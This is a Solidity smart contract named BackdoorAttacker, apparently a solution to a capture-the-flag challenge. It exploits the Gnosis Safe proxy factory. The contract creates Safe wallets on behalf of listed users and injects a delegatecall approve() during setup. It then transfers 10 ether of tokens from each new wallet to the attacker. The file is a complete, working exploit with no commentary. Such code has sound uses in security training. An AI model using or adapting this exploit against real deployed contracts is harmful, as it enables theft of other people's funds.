// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function approve(address token, address spender) external {
        IERC20(token).approve(spender, 10 ether);
    }

    function attack(
        GnosisSafeProxyFactory factory,
        address singleton,
        address[] memory users,
        address callback,
        address token
    ) external {
        require(msg.sender == owner, "Only owner can call this function");

        for (uint256 i; i != 4; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    owners,
                    1,
                    address(this),
                    abi.encodeWithSignature("approve(address,address)", token, address(this)),
                    address(0),
                    address(0),
                    0,
                    address(0)
                ),
                i,
                IProxyCreationCallback(callback)
            );
            IERC20(token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
